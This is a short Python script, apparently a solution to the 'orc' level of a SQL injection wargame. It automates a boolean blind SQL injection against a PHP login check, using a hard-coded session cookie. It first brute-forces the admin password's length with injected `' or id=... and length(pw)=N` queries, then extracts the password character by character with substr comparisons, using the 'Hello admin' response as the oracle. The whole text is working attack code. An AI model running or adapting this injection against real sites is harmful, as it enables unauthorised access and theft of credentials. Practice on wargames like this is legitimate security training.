import requests, string

cookies=dict(PHPSESSID="cbhnhomh9of529jk0k8bqqsu86") 
problem = 'https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php'
length = 0
string_set= string.digits + string.ascii_letters

for i in range(20):
  request = '?pw=\' or id=0x61646D696E and length(pw)='
  request += str(i) + ' -- !'
  print(problem + request)
  reponse = requests.get(problem + request, cookies=cookies)
  if reponse.text.find('Hello admin') >= 0:
    print('Password length:' + str(i))
    length = i
    break

for i in range(length):
  for c in string_set:
    request = '?pw=\' or id=0x61646D696E and substr(pw,'
    request += str(i + 1) + ', 1)=' + str(ascii(c)) + ' -- !'
    reponse = requests.get(problem + request, cookies=cookies)
    if reponse.text.find('Hello admin') >= 0:
      print(str(i + 1) +'th character: ' + c)
      break